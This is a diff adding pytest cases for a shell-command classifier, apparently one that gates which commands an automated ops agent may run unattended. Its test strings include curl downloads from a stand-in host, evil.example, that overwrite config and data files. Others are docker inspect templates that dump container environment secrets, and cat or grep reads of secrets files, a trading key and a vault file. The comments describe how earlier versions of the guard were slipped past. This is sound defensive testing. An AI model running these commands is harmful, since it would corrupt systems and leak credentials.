@@ -675,3 +675,72 @@ def test_the_real_reads_survive_the_allowlists(cmd, host):
     """The allowlists must still admit the runbooks' own GETs and finds -- a guard that refuses
     everything has moved the outage, not removed it."""
     assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.AUTONOMOUS
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        # `curl -o` WRITES the file it names. Verified: the admitted string overwrote a seeded
+        # marker with example.com's HTML. It sat on the read path, which returns AUTONOMOUS before
+        # the protected-object veto runs -- so naming the unbackfillable capture dir did not stop it.
+        "curl -o /var/lib/zcrypto-capture/x.parquet https://evil.example/p",
+        "sudo curl -fsS -o /etc/zcrypto/zcrypto.toml https://evil.example/cfg",
+        "curl -O https://evil.example/payload",
+        "curl --output /tmp/x https://evil.example/p",
+        # A Go template reaches the WHOLE object through a bare root reference, so allowlisting the
+        # selectors a format mentions is unsound: `{{.Name}}` is safe and `{{json .}}` beside it
+        # marshals ContainerJSON. Verified against a container carrying a fake key -- it printed it.
+        "docker inspect --format '{{.Name}}{{json .}}' zcrypto-engine",
+        'docker inspect --format \'{{.Id}}{{index . "Config" "Env"}}\' zcrypto-engine',
+        "docker inspect --format '{{json .}}' zcrypto-engine",
+        "docker inspect --format='{{.Name}}{{json .}}' zcrypto-engine",
+        "docker inspect -f '{{.Name}}{{json .}}' zcrypto-engine",
+        "docker inspect --format '{{range .Config.Env}}{{.}}{{end}}' zcrypto-engine",
+        # The classifier used to disagree with bash here: a raw replace turned this into
+        # `docker logs zcrypto-engine`, while bash reads a command `logs2` redirecting to a file.
+        "docker logs2>/dev/nullzcrypto-engine",
+        # A read that surfaces the trade key is the same defect `docker inspect` is guarded against.
+        "cat /opt/zcrypto-capture/logship-secrets.env",
+        "sudo cat /etc/zcrypto/secrets.env",
+        "grep -r KRAKEN /opt/zcrypto-capture/logship-secrets.env",
+        "cat infra/ansible/group_vars/all/vault.yml",
+    ],
+)
+def test_the_round_four_escapes_are_refused(cmd):
+    """Both Criticals here lived in post-checks CARRIED OVER from the parser, not in the new table.
+
+    That is the lesson worth keeping: the enumerated shapes held under attack, and the two hand-written
+    predicates bolted onto them did not. A post-check that reasons about a command's arguments is the
+    old design surviving inside the new one, and it failed the same way -- by allowlisting what it
+    could name while the danger arrived through something it could not.
+    """
+    for host in ("zcrypto", "ops", "nas"):
+        assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.PREPARED, host
+
+
+@pytest.mark.parametrize(
+    "cmd,host",
+    [
+        ("curl -fsS -m 10 -o /dev/null -w '%{http_code}\\n' https://healthchecks.io/", "ops"),
+        ("sudo docker inspect grafana-alloy --format '{{json .Mounts}}'", "ops"),
+        (
+            "sudo docker inspect zcrypto-ops-liquidations --format '{{.State.Status}} {{.RestartCount}} {{json .Config.Entrypoint}}'",
+            "ops",
+        ),
+        (
+            "sudo docker inspect grafana-alloy --format 'img={{.Config.Image}} restarts={{.RestartCount}} started={{.State.StartedAt}} oom={{.State.OOMKilled}}'",
+            "ops",
+        ),
+        ("sudo ls -la /opt/zcrypto-capture/logship-secrets.env", "zcrypto"),
+        ("sha256sum /etc/zcrypto-capture/alloy/conf/config.alloy", "zcrypto"),
+    ],
+)
+def test_the_round_four_fixes_kept_their_true_positives(cmd, host):
+    """Each fix was cut to the exact shape of its defect, and this is what that bought.
+
+    `-o` admits `/dev/null` alone, so the dead-man liveness probe still runs; the format check
+    grammars the ACTIONS rather than banning `json`, so the runbooks' labelled multi-selector
+    formats still run; and the secret veto covers only heads that print file CONTENT, so `ls -la`
+    still answers the permission check on the secrets file it names.
+    """
+    assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.AUTONOMOUS
